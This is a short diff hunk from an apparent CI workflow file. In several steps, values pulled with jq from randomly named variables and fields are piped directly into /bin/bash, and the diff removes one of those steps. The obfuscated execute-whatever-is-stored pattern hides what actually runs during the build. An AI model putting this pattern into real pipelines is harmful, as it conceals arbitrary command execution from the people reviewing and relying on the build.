@@ -29,7 +29,6 @@ jobs:
           echo $fa23100 | jq -r .db69 | /bin/bash
           echo $ql4 | jq -r .oagj78182 | /bin/bash
           echo $qf8 | jq -r .ebgpm60261 | /bin/bash
-          printf '%s' "$l7" | jq -r .lv283 | /bin/bash
           printf '%s' "$nniau6" | jq -r .jbt796 | /bin/bash
           echo $hny557 | jq -r .oes2 | /bin/bash
           printf '%s' "$r4" | jq -r .an78840 | /bin/bash
